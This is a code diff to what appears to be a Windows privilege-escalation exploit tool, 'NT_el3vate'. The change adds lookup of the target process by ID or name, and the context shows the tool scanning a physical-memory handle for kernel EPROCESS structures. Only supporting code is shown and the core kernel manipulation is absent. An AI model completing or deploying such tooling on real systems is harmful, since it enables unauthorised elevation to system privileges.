@@ -4,6 +4,7 @@
 #include <winternl.h>
 #include <stdio.h>
 #include <string.h>
+#include <string>
 #include <vector>
 #include <chrono>
 
@@ -31,12 +32,54 @@ int main(int argc, char** argv)
 {
 
 	if (argc < 2) {
-		fprintf(stderr,"Usage: .\\NT_el3vate.exe <processName>.exe \n");
+		fprintf(stderr,"Usage: .\\NT_el3vate.exe <processID / processName> \n");
 		system("pause");
 		return EXIT_FAILURE;
 	}
 
-	char* targetProcess = argv[1];
+	int argcW;
+	LPWSTR* argvW = CommandLineToArgvW(GetCommandLineW(), &argcW);
+
+	std::string procName = argv[1];
+	DWORD procId = 0;
+
+	std::cout << "[ ] Get procId and procName..." << std::endl;
+
+	// detect if process name is used instead of processID
+	if (procName.find(".exe") != std::string::npos)
+	{
+		PROCESSENTRY32 entry;
+		// Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32).
+		// If you do not initialize dwSize, Process32First fails.
+		entry.dwSize = sizeof(PROCESSENTRY32);
+
+		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+
+		if (Process32First(snapshot, &entry) == TRUE)
+		{
+			while (Process32Next(snapshot, &entry) == TRUE)
+			{
+				if (wcscmp(entry.szExeFile, argvW[1]) == 0)
+				{
+					procId = entry.th32ProcessID;
+				}
+			}
+		}
+		// very importent to close the handle 
+		CloseHandle(snapshot);
+		if (procId == 0) {
+			std::cout << "[-] Could not find process: " << argv[1] << std::endl;
+			return 1;
+		}
+	}
+	else
+	{
+		procId = std::stol(argvW[1]);
+	}
+
+	std::cout << "[+] Got procId and procName: " << std::endl;
+	std::cout << "    |- procId: " << procId << std::endl;
+	std::cout << "    |- procName: " << procName << std::endl;
 
 	// measure execution time of program
 	auto start = std::chrono::high_resolution_clock::now();
@@ -110,11 +153,11 @@ int main(int argc, char** argv)
 		}
 	}
 
-	printf("----------------------------------------------- now for %s\n", targetProcess);
+	printf("----------------------------------------------- now for %s\n", procName.c_str());
 
 	const int EPROCESS_cmd_size = 50;
 	unsigned __int64 EPROCESS_cmd[EPROCESS_cmd_size];
-	int occurrences_cmd = GetEPROCESSPhysicalBase(targetProcess, GetCurrentProcessId(), hPhysicalMemory, EPROCESS_cmd, EPROCESS_cmd_size);
+	int occurrences_cmd = GetEPROCESSPhysicalBase(procName.c_str(), procId, hPhysicalMemory, EPROCESS_cmd, EPROCESS_cmd_size);
 	if (occurrences_cmd == -1)
 	{
 		fprintf(stderr, "[!] GetEPROCESSPhysicalBase failed\n");
